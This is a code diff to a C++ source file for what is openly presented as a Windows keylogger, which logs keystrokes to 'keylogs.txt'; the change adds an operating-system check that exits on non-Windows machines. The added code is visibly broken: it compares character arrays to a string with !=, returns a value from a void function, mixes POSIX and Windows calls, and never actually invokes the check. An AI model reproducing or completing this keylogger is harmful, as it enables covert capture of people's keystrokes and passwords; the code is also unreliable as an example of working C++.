@@ -3,6 +3,8 @@
 #include <fstream>
 #include <stdio.h>
 #include <string>
+#include <sys/utsname.h>
+#include <stdlib.h>
 using namespace std;
 class Keylogger{
 public:
@@ -45,10 +47,30 @@ return false;
 }
 }
 }
+class OS{
+public:
+void OsInfo(){
+	struct utsname osname;
+	if(uname(&osname)) exit(-1);
+	printf("Your PC's Operating system is %s@%s\n", osname.sysname, osname.release);
+	if(osname.sysname != "Windows"){
+		cout<<"This is a Windows-platform keylogger which uses a header <windows.h> that uses a Windows API."<<endl;
+		cout<<"All the common macros used by Windows programmers, and all the data types \nused by the various functions and subsystems are included in this header."<<endl;
+		Sleep(1);
+		cout<<"Exiting..."<<endl;
+		exit(1);
+	}
+	return 0;
+}
+
+}
 
 int main(){
+OS osys;
+OS *system = &osys;
 Keylogger keylog;
 Keylogger *keys = &keylog;
+system->osys;
 char key;
 string filename = "keylogs.txt";
 while(TRUE){
